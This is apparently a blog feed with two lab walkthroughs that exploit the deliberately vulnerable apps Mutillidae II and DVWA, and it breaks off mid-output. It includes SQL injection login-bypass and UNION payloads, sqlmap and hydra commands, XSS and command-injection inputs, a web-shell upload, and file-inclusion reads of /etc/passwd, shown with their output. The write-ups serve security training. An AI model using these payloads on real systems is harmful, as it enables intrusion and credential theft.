&lt;p&gt;&lt;em&gt;OWASP Mutillidae II&lt;/em&gt; is a free, open source, deliberately vulnerable web-application providing a target for web-security enthusiast. It features many vulnerabilities and challenges.
Contains at least one vulnerability for each of the &lt;em&gt;OWASP Top Ten&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;For this writeup Mutillidae version 2.6.17 inside XAMPP (Windows 7) was used (&lt;em&gt;Security Level: 0&lt;/em&gt;).&lt;/p&gt;

&lt;p&gt;The OWASP Top 10 - 2013 is as follows:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#a1&#34;&gt;A1 Injection&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#a2&#34;&gt;A2 Broken Authentication and Session Management&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#a3&#34;&gt;A3 Cross-Site Scripting (XSS)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#a4&#34;&gt;A4 Insecure Direct Object References&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#a5&#34;&gt;A5 Security Misconfiguration&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;A6 Sensitive Data Exposure&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;A7 Missing Function Level Access Control&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;A8 Cross-Site Request Forgery (CSRF)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;A9 Using Components with Known Vulnerabilities&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;A10 Unvalidated Redirects and Forwards&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;a-name-a1-a-a1-injection:3a3e9037ddd6e7a6645f41b17becbe3a&#34;&gt;&lt;a name=&#34;a1&#34;&gt;&lt;/a&gt; A1 Injection&lt;/h2&gt;

&lt;p&gt;Injection flaws, such as SQL, OS, and LDAP injection occur when untrusted data is sent to an interpreter as part of a command or query. The attacker’s hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization.&lt;/p&gt;

&lt;h3 id=&#34;sql-injections:3a3e9037ddd6e7a6645f41b17becbe3a&#34;&gt;SQL Injections&lt;/h3&gt;

&lt;p&gt;The first SQL injection is in the login page. If we input single quote as password and try to login, the app conveniently shows us the SQL query (in the error message):&lt;/p&gt;

&lt;p&gt;&lt;code&gt;SELECT * FROM accounts WHERE username=&#39;&#39; AND password=&#39;&#39;&#39;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;We can see that both username and password fields should be injectable. We can use that information to login as any user.
Using username &lt;strong&gt;&lt;code&gt;admin&#39;-- -&lt;/code&gt;&lt;/strong&gt; and any password or username &lt;strong&gt;&lt;code&gt;admin&lt;/code&gt;&lt;/strong&gt; and password &lt;strong&gt;&lt;code&gt;&#39; or 1=1-- -&lt;/code&gt;&lt;/strong&gt; we can login as admin.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2015/02/03/admin.png&#34; alt=&#34;admin&#34; /&gt;&lt;/p&gt;

&lt;p&gt;There&amp;rsquo;s another SQL injection in the &lt;code&gt;view-someones-blog.php&lt;/code&gt; page. Let&amp;rsquo;s use &lt;code&gt;burp&lt;/code&gt; and &lt;code&gt;sqlmap&lt;/code&gt; to automate the exploitation. First we intercept the HTTP request with burp and save it to a file:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2015/02/03/request.png&#34; alt=&#34;request&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Then we can use the request file with sqlmap and extract data from the database(s):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sqlmap -r ~/request --dbs
[05:56:08] [INFO] the back-end DBMS is MySQL
web server operating system: Windows
web application technology: PHP 5.6.3, Apache 2.4.10
back-end DBMS: MySQL 5.0
[05:56:08] [INFO] fetching database names
available databases [8]:
[*] cdcol
[*] information_schema
[*] mysql
[*] nowasp
[*] performance_schema
[*] phpmyadmin
[*] test
[*] webauth
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We can dump user account data:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Database: nowasp
Table: accounts
[23 entries]
+-----+----------+---------------+----------+--------------+-----------+-----------------------------------------+
| cid | username | lastname      | is_admin | password     | firstname | mysignature                             |
+-----+----------+---------------+----------+--------------+-----------+-----------------------------------------+
| 9   | simba    | Lion          | FALSE    | password     | Simba     | I am a super-cat                        |
| 8   | bobby    | Hill          | FALSE    | password     | Bobby     | Hank is my dad                          |
| 7   | jim      | Rome          | FALSE    | password     | Jim       | Rome is burning                         |
| 6   | samurai  | WTF           | FALSE    | samurai      | Samurai   | Carving fools                           |
| 5   | bryce    | Galbraith     | FALSE    | password     | Bryce     | I Love SANS                             |
| 4   | jeremy   | Druin         | FALSE    | password     | Jeremy    | d1373 1337 speak                        |
| 3   | john     | Pentest       | FALSE    | monkey       | John      | I like the smell of confunk             |
| 2   | adrian   | Crenshaw      | TRUE     | somepassword | Adrian    | Zombie Films Rock!                      |
| 23  | ed       | Skoudis       | FALSE    | pentest      | Ed        | Commandline KungFu anyone?              |
| 22  | james    | Jardine       | FALSE    | i&amp;lt;3devs      | James     | Occupation: Researcher                  |
| 21  | CHook    | Hook          | FALSE    | JollyRoger   | Captain   | Gator-hater                             |
| 20  | PPan     | Pan           | FALSE    | NotTelling   | Peter     | Where is Tinker?                        |
| 1   | admin    | Administrator | TRUE     | adminpass    | System    | g0t r00t?                               |
| 19  | ABaker   | Baker         | TRUE     | SoSecret     | Aaron     | Muffin tops only                        |
| 18  | tim      | Tomes         | FALSE    | lanmaster53  | Tim       | Because reconnaissance is hard to spell |
| 17  | rocky    | Paws          | FALSE    | stripes      | Rocky     | treats?                                 |
| 16  | patches  | Pester        | FALSE    | tortoise     | Patches   | meow                                    |
| 15  | dave     | Kennedy       | FALSE    | set          | Dave      | Bet on S.E.T. FTW                       |
| 14  | kevin    | Johnson       | FALSE    | 42           | Kevin     | Doug Adams rocks                        |
| 13  | john     | Wall          | FALSE    | password     | John      | Do the Duggie!                          |
| 12  | cal      | Calipari      | FALSE    | password     | John      | C-A-T-S Cats Cats Cats                  |
| 11  | scotty   | Evil          | FALSE    | password     | Scotty    | Scotty do                               |
| 10  | dreveil  | Evil          | FALSE    | password     | Dr.       | Preparation H                           |
+-----+----------+---------------+----------+--------------+-----------+-----------------------------------------+
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;other-injections:3a3e9037ddd6e7a6645f41b17becbe3a&#34;&gt;Other Injections&lt;/h3&gt;

&lt;h4 id=&#34;html-javascript-injection:3a3e9037ddd6e7a6645f41b17becbe3a&#34;&gt;HTML/Javascript Injection&lt;/h4&gt;

&lt;p&gt;These injections occur when user input ends up in a generated web page and is treated as code rather than text.
In the &lt;code&gt;browser-info.php&lt;/code&gt; page we can see information about our browser, such as User-Agent, Referrer, cookie information, etc.
If we modify User-Agent string (via browser add-ons or burp) to be:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(&#39;User Agent injection!&#39;)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;We can see that it becomes part of the page code:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2015/02/03/ua.png&#34; alt=&#34;User-Agent&#34; /&gt;&lt;/p&gt;

&lt;p&gt;It is actually displayed two times, because it is included in two different places within the page.&lt;/p&gt;

&lt;h4 id=&#34;command-injection:3a3e9037ddd6e7a6645f41b17becbe3a&#34;&gt;Command Injection&lt;/h4&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2015/02/03/dns.png&#34; alt=&#34;DNS&#34; /&gt;&lt;/p&gt;

&lt;p&gt;In this page the user input is intended to a shell command&amp;rsquo;s argument.
However, most shells support stacked commands and if user input is not sanitized, we can execute additional commands in the context of the web server.&lt;/p&gt;

&lt;p&gt;In Linux we can add additional commands with &lt;code&gt;;&lt;/code&gt; and in Windows with &lt;code&gt;&amp;amp;&lt;/code&gt; or &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;.
Adding &lt;code&gt;&amp;amp; dir&lt;/code&gt; will result in:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2015/02/03/dir.png&#34; alt=&#34;dir&#34; /&gt;&lt;/p&gt;

&lt;!--
#### XML Injection
--&gt;

&lt;h2 id=&#34;a-name-a2-a-a2-broken-authentication-and-session-management:3a3e9037ddd6e7a6645f41b17becbe3a&#34;&gt;&lt;a name=&#34;a2&#34;&gt;&lt;/a&gt; A2 Broken Authentication and Session Management&lt;/h2&gt;

&lt;p&gt;Application functions related to authentication and session management are often not implemented correctly, allowing attackers to compromise passwords, keys, or session tokens, or to exploit other implementation flaws to assume other users’ identities.&lt;/p&gt;

&lt;p&gt;Mutillidae has a page called &amp;ldquo;View User Privilege Level&amp;rdquo; where an attacker can escalate to root privileges by attacking a weak encryption mechanism.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2015/02/03/priv.png&#34; alt=&#34;priv&#34; /&gt;&lt;/p&gt;

&lt;p&gt;This page has a default http parameter &lt;code&gt;iv=6bc24fc1ab650b25b4114e93a98f1eba&lt;/code&gt; which somehow encodes the 3 ids shown in the picture.
By changing various bytes in the &lt;em&gt;iv&lt;/em&gt; parameter we can change the values displayed on the page. After a few tries we can see that &lt;strong&gt;5th&lt;/strong&gt; and &lt;strong&gt;8th&lt;/strong&gt; byte directly correspond to the first chars of &lt;em&gt;UID&lt;/em&gt; and &lt;em&gt;GID&lt;/em&gt;.
With the value 6bc24fc1&lt;strong&gt;&lt;em&gt;00&lt;/em&gt;&lt;/strong&gt;650b&lt;strong&gt;&lt;em&gt;00&lt;/em&gt;&lt;/strong&gt;b4114e93a98f1eba,
we have &lt;em&gt;0x9a&lt;/em&gt; and &lt;em&gt;0x14&lt;/em&gt; as first &lt;em&gt;UID&lt;/em&gt; and &lt;em&gt;GID&lt;/em&gt; chars respectively.&lt;/p&gt;

&lt;p&gt;Normally we could use burp to brute force the values (256 + 256 tries), but here simple &lt;em&gt;XOR&lt;/em&gt; is used, so we
can do it by hand. We are looking for values that &lt;em&gt;XOR&lt;/em&gt; with &lt;em&gt;0x9a&lt;/em&gt; and &lt;em&gt;0x14&lt;/em&gt; and produce &lt;em&gt;0x30&lt;/em&gt;. Since &lt;em&gt;XOR&lt;/em&gt; is communicative, we can calculate:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;0x9A XOR 0x30 = 0xAA
0x14 XOR 0x30 = 0x24
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Using 6bc24fc1&lt;strong&gt;&lt;em&gt;aa&lt;/em&gt;&lt;/strong&gt;650b&lt;strong&gt;&lt;em&gt;24&lt;/em&gt;&lt;/strong&gt;b4114e93a98f1eba value we get:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2015/02/03/root.png&#34; alt=&#34;root&#34; /&gt;&lt;/p&gt;

&lt;h2 id=&#34;a-name-a3-a-a3-cross-site-scripting-xss:3a3e9037ddd6e7a6645f41b17becbe3a&#34;&gt;&lt;a name=&#34;a3&#34;&gt;&lt;/a&gt; A3 Cross-Site Scripting (XSS)&lt;/h2&gt;

&lt;p&gt;XSS flaws occur whenever an application takes untrusted data and sends it to a web browser without proper validation or escaping. XSS allows attackers to execute scripts in the victim’s browser which can hijack user sessions, deface web sites, or redirect the user to malicious sites.&lt;/p&gt;

&lt;p&gt;XSS can be either &lt;em&gt;Reflected (First Order)&lt;/em&gt; or &lt;em&gt;Persistent (Second Order)&lt;/em&gt;. Reflected XSS requires a victim to visit maliciously crafted URL, while the more dangerous persistent XSS gets stored on the server and is executed each time the vulnerable page is loaded. On the &lt;code&gt;add-to-your-blog.php&lt;/code&gt; page a user can create a new blog post. This page contains a persistent XSS vulnerability. If we create a blog post with this code:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(&amp;quot;Malicious blog post!&amp;quot;)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Then upon viewing the blog post the victim&amp;rsquo;s browser will execute the malicious code:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2015/02/03/xss.png&#34; alt=&#34;xss&#34; /&gt;&lt;/p&gt;

&lt;h2 id=&#34;a-name-a4-a-a4-insecure-direct-object-references:3a3e9037ddd6e7a6645f41b17becbe3a&#34;&gt;&lt;a name=&#34;a4&#34;&gt;&lt;/a&gt; A4 Insecure Direct Object References&lt;/h2&gt;

&lt;p&gt;A direct object reference occurs when a developer exposes a reference to an internal implementation object, such as a file, directory, or database key. Without an access control check or other protection, attackers can manipulate these references to access unauthorized data.&lt;/p&gt;

&lt;p&gt;Mutillidae contains a few &lt;em&gt;Local File Inclusion (LFI)&lt;/em&gt; vulnerabilities. One is in the &lt;code&gt;arbitrary-file-inclusion.php&lt;/code&gt; page.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;http://192.168.1.66/mutillidae/index.php?page=arbitrary-file-inclusion.php&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Here any file specified in the &lt;em&gt;page&lt;/em&gt; variable gets included in the current page. This allows attacker to execute any php file present on the web server or view contents of sensitive non php files (logs, configuration, etc.).
In some cases this vulnerability allows to include remote php files (&lt;em&gt;Remote File Inclusion&lt;/em&gt;), however, newer PHP configurations disable this by default.&lt;/p&gt;

&lt;p&gt;Another vulnerable page is &lt;code&gt;text-file-viewer.php&lt;/code&gt;. This page allows us to view text files from a remote server, by selecting them from a drop-down list.
However, if intercept the request with burp and change &lt;code&gt;textfile&lt;/code&gt; variable, we can view the source code of any
web server files. We can view the source code of the current page:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;try {
	switch ($_SESSION[&amp;quot;security-level&amp;quot;]){
		case &amp;quot;0&amp;quot;: // This code is insecure
		case &amp;quot;1&amp;quot;: // This code is insecure
			$lUseTokenization = FALSE;
			$lEncodeOutput = FALSE;
			$lProtectAgainstMethodTampering = FALSE;
		break;
    		
		case &amp;quot;2&amp;quot;:
		case &amp;quot;3&amp;quot;:
		case &amp;quot;4&amp;quot;:
   		case &amp;quot;5&amp;quot;: // This code is fairly secure
			$lUseTokenization = TRUE;
			$lEncodeOutput = TRUE;
			$lProtectAgainstMethodTampering = TRUE;
		break;
   	}// end switch ($_SESSION[&amp;quot;security-level&amp;quot;])
}catch(Exception $e){
	echo $CustomErrorHandler-&amp;gt;FormatError($e, &amp;quot;Error in text file viewer. Cannot load file.&amp;quot;);
}// end try
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;a-name-a5-a-a5-security-misconfiguration:3a3e9037ddd6e7a6645f41b17becbe3a&#34;&gt;&lt;a name=&#34;a5&#34;&gt;&lt;/a&gt; A5 Security Misconfiguration&lt;/h2&gt;

&lt;p&gt;Good security requires having a secure configuration defined and deployed for the application, frameworks, application server, web server, database server, and platform. Secure settings should be defined, implemented, and maintained, as defaults are often insecure. Additionally, software should be kept up to date.&lt;/p&gt;

&lt;p&gt;Most common security misconfiguration is relying on &amp;ldquo;hidden&amp;rdquo; directories and files. The only security here being the assumption that the attacker will not find out the names of such resources, because they have no links to them
from the main pages. However, these names can be guessed or brute forced. We have a few of them in our web server. World accessible &lt;code&gt;passwords&lt;/code&gt; folder:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2015/02/03/pass.png&#34; alt=&#34;pass&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Or &lt;code&gt;data&lt;/code&gt; folder:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2015/02/03/data.png&#34; alt=&#34;data&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Another common misconfiguration is unrestricted file upload. Most of the time files containing executable code (php, asp, js, etc.) are not allowed. However, if restrictions are implemented badly or not present at all, then attacker
can execute code on the server via file upload:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2015/02/03/upload.png&#34; alt=&#34;upload&#34; /&gt;&lt;/p&gt;

&lt;p&gt;After uploading the shell, we can browse to it and execute commands on the server:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;http://192.168.1.66/mutillidae/upload/shell.php?cmd=dir&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Volume in drive C has no label. Volume Serial Number is E2B8-4C80 Directory of C:\xampp\htdocs\mutillidae\upload 02/05/2015 11:24 AM
. 02/05/2015 11:24 AM
.. 02/05/2015 11:05 AM 132 shell.php 1 File(s) 132 bytes 2 Dir(s) 12,596,895,744 bytes free dir
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;to-be-continued:3a3e9037ddd6e7a6645f41b17becbe3a&#34;&gt;To be continued&amp;hellip;&lt;/h3&gt;

&lt;!--

## A6 Sensitive Data Exposure

Many web applications do not properly protect sensitive data, such as credit cards, tax IDs, and authentication credentials. Attackers may steal or modify such weakly protected data to conduct credit card fraud, identity theft, or other crimes. Sensitive data deserves extra protection such as encryption at rest or in transit, as well as special precautions when exchanged with the browser. 

## A7 Missing Function Level Access Control

Most web applications verify function level access rights before making that functionality visible in the UI. However, applications need to perform the same access control checks on the server when each function is accessed. If requests are not verified, attackers will be able to forge requests in order to access functionality without proper authorization. 

## A8 Cross-Site Request Forgery (CSRF)

A CSRF attack forces a logged-on victim’s browser to send a forged HTTP request, including the victim’s session cookie and any other automatically included authentication information, to a vulnerable web application. This allows the attacker to force the victim’s browser to generate requests the vulnerable application thinks are legitimate requests from the victim. 

## A9 Using Components with Known Vulnerabilities

Components, such as libraries, frameworks, and other software modules, almost always run with full privileges. If a vulnerable component is exploited, such an attack can facilitate serious data loss or server takeover. Applications using components with known vulnerabilities may undermine application defenses and enable a range of possible attacks and impacts. 

## A10 Unvalidated Redirects and Forwards

Web applications frequently redirect and forward users to other pages and websites, and use untrusted data to determine the destination pages. Without proper validation, attackers can redirect victims to phishing or malware sites, or use forwards to access unauthorized pages. 
--&gt;
</description>
    </item>
    
    <item>
      <title>Exploring Damn Vulnerable Web Application</title>
      <link>http://mislusnys.github.io/blog/2015/02/02/exploring-damn-vulnerable-web-application/</link>
      <pubDate>Mon, 02 Feb 2015 08:40:17 +0000</pubDate>
      
      <guid>http://mislusnys.github.io/blog/2015/02/02/exploring-damn-vulnerable-web-application/</guid>
      <description>

&lt;h2 id=&#34;intro:a278ed06f786dfe478032a0f72deba1a&#34;&gt;Intro&lt;/h2&gt;

&lt;p&gt;Damn Vulnerable Web App (DVWA) is a PHP/MySQL web application that is damn vulnerable. Its main goals are to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and aid teachers/students to teach/learn web application security in a class room environment.&lt;/p&gt;

&lt;p&gt;In this report we will be exploiting the vulnerabilities that are present in the DVWA (version 1.0.7).
We will use the version that is bundled in the &lt;a href=&#34;http://sourceforge.net/projects/metasploitable/files/Metasploitable2/&#34;&gt;Metasploitable 2&lt;/a&gt; VM.
We will use the lowest security setting (&lt;em&gt;PHPIDS:disabled&lt;/em&gt; and &lt;em&gt;Security Level:low&lt;/em&gt;).&lt;/p&gt;

&lt;h2 id=&#34;1-brute-force:a278ed06f786dfe478032a0f72deba1a&#34;&gt;1. Brute Force&lt;/h2&gt;

&lt;p&gt;Our first task is to brute force HTTP based login form:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/bf.png&#34; alt=&#34;Brute Force&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Using &lt;em&gt;burp&lt;/em&gt; we find that parameters are transmitted via URL:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;http://192.168.52.129/dvwa/vulnerabilities/brute/?username=test&amp;amp;password=test&amp;amp;Login=Login#&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;And our session data:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;Cookie: security=low; PHPSESSID=872eb7bf8ffde53b4d00d3c1a5df9a28&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Using this information we can use &lt;code&gt;hydra&lt;/code&gt; to brute force the login form:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@kali:~# hydra 192.168.52.129 -L user.txt -P pass.txt http-get-form &amp;quot;/dvwa/vulnerabilities/brute/index.php:username=^USER^&amp;amp;password=^PASS^&amp;amp;Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=872eb7bf8ffde53b4d00d3c1a5df9a28&amp;quot;
Hydra v7.6 (c)2013 by van Hauser/THC &amp;amp; David Maciejak - for legal purposes only

Hydra (http://www.thc.org/thc-hydra) starting at 2015-02-02 09:13:54
[DATA] 16 tasks, 1 server, 28 login tries (l:4/p:7), ~1 try per task
[DATA] attacking service http-get-form on port 80
[80][www-form] host: 192.168.52.129   login: admin   password: password
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2015-02-02 09:13:57
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We found valid login credentials: &lt;code&gt;admin:password&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&#34;2-command-execution:a278ed06f786dfe478032a0f72deba1a&#34;&gt;2. Command Execution&lt;/h2&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/ce.png&#34; alt=&#34;Command Execution&#34; /&gt;&lt;/p&gt;

&lt;p&gt;This part of the app gives the current user the ability to ping a host.
However it uses a vulnerable piece of code:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;$cmd = shell_exec( &#39;ping  -c 3 &#39; . $target );&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Since we control the &lt;code&gt;$target&lt;/code&gt; variable, we can use &lt;code&gt;;&lt;/code&gt; or &lt;code&gt;||&lt;/code&gt; to stack commands.&lt;/p&gt;

&lt;p&gt;Using &lt;code&gt;127.0.0.1;ls -al&lt;/code&gt; as input we get:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.000 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.043 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.089 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1998ms
rtt min/avg/max/mdev = 0.000/0.044/0.089/0.036 ms
total 20
drwxr-xr-x  4 www-data www-data 4096 May 20  2012 .
drwxr-xr-x 11 www-data www-data 4096 May 20  2012 ..
drwxr-xr-x  2 www-data www-data 4096 May 20  2012 help
-rw-r--r--  1 www-data www-data 1509 Mar 16  2010 index.php
drwxr-xr-x  2 www-data www-data 4096 May 20  2012 source
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;3-cross-site-request-forgery:a278ed06f786dfe478032a0f72deba1a&#34;&gt;3. Cross Site Request Forgery&lt;/h2&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/csrf.png&#34; alt=&#34;CSRF&#34; /&gt;&lt;/p&gt;

&lt;p&gt;CSRF is an attack in which an authenticated user (usually administrator) unknowingly executes a certain action.
In our case the password change operation results in the following request:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;http://192.168.52.129/dvwa/vulnerabilities/csrf/?password_new=test&amp;amp;password_conf=test&amp;amp;Change=Change#&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;If we can trick an authenticated user to make this request, we can change this user&amp;rsquo;s password. Usually this is done by tricking the user into visiting a page controlled by the attacker with malicious request embedded inside &lt;code&gt;img&lt;/code&gt;, &lt;code&gt;iframe&lt;/code&gt; tags or inside malicious javascript code.&lt;/p&gt;

&lt;h2 id=&#34;4-file-inclusion:a278ed06f786dfe478032a0f72deba1a&#34;&gt;4. File Inclusion&lt;/h2&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/fi.png&#34; alt=&#34;File Inclusion&#34; /&gt;&lt;/p&gt;

&lt;p&gt;This one is pretty straight forward. We can change the &lt;code&gt;page&lt;/code&gt; variable to display sensitive information:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;http://192.168.52.129/dvwa/vulnerabilities/fi/?page=/etc/passwd&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh 
bin:x:2:2:bin:/bin:/bin/sh 
sys:x:3:3:sys:/dev:/bin/sh 
sync:x:4:65534:sync:/bin:/bin/sync 
games:x:5:60:games:/usr/games:/bin/sh 
man:x:6:12:man:/var/cache/man:/bin/sh 
lp:x:7:7:lp:/var/spool/lpd:/bin/sh 
mail:x:8:8:mail:/var/mail:/bin/sh 
news:x:9:9:news:/var/spool/news:/bin/sh 
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh 
proxy:x:13:13:proxy:/bin:/bin/sh 
www-data:x:33:33:www-data:/var/www:/bin/sh 
backup:x:34:34:backup:/var/backups:/bin/sh 
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh 
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh 
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh 
libuuid:x:100:101::/var/lib/libuuid:/bin/sh 
dhcp:x:101:102::/nonexistent:/bin/false 
syslog:x:102:103::/home/syslog:/bin/false 
klog:x:103:104::/home/klog:/bin/false 
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin 
msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash 
bind:x:105:113::/var/cache/bind:/bin/false 
postfix:x:106:115::/var/spool/postfix:/bin/false 
ftp:x:107:65534::/home/ftp:/bin/false 
postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash 
mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false 
tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false 
distccd:x:111:65534::/:/bin/false 
user:x:1001:1001:just a user,111,,:/home/user:/bin/bash 
service:x:1002:1002:,,,:/home/service:/bin/bash 
telnetd:x:112:120::/nonexistent:/bin/false 
proftpd:x:113:65534::/var/run/proftpd:/bin/false 
statd:x:114:65534::/var/lib/nfs:/bin/false 
snmp:x:115:65534::/var/lib/snmp:/bin/false 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;5-1-sql-injection:a278ed06f786dfe478032a0f72deba1a&#34;&gt;5.1 SQL Injection&lt;/h2&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/sqli.png&#34; alt=&#34;SQLI&#34; /&gt;&lt;/p&gt;

&lt;p&gt;User input is unfiltered and used in the following query:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;code&gt;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;If we enter &lt;strong&gt;&amp;rsquo; or 1=1&amp;ndash; -&lt;/strong&gt; as an id then the query becomes:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;code&gt;SELECT first_name, last_name FROM users WHERE user_id = &#39;&#39; or 1=1&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;which makes the WHERE clause always true and shows us all the records:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ID: &#39;or 1=1-- -
First name: admin
Surname: admin

ID: &#39;or 1=1-- -
First name: Gordon
Surname: Brown

ID: &#39;or 1=1-- -
First name: Hack
Surname: Me

ID: &#39;or 1=1-- -
First name: Pablo
Surname: Picasso

ID: &#39;or 1=1-- -
First name: Bob
Surname: Smith
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Using &lt;strong&gt;UNION&lt;/strong&gt; keyword we can extract any information available to the app&amp;rsquo;s user from the database.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;code&gt;&#39; union select database(),null -- -&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ID: &#39; union select database(),null -- -
First name: dvwa
Surname: 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;&lt;code&gt;&#39; union select table_name,null from information_schema.tables where table_schema=&#39;dvwa&#39;-- -&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ID:  &#39; union select table_name,null from information_schema.tables where table_schema=&#39;dvwa&#39;-- -
First name: guestbook
Surname: 

ID:  &#39; union select table_name,null from information_schema.tables where table_schema=&#39;dvwa&#39;-- -
First name: users
Surname: 

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;&lt;code&gt;&#39; union select column_name,null from information_schema.columns where table_name=&#39;users&#39;-- -&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ID: &#39; union select column_name,null from information_schema.columns where table_name=&#39;users&#39;-- -
First name: user_id
Surname: 

ID: &#39; union select column_name,null from information_schema.columns where table_name=&#39;users&#39;-- -
First name: first_name
Surname: 

ID: &#39; union select column_name,null from information_schema.columns where table_name=&#39;users&#39;-- -
First name: last_name
Surname: 

ID: &#39; union select column_name,null from information_schema.columns where table_name=&#39;users&#39;-- -
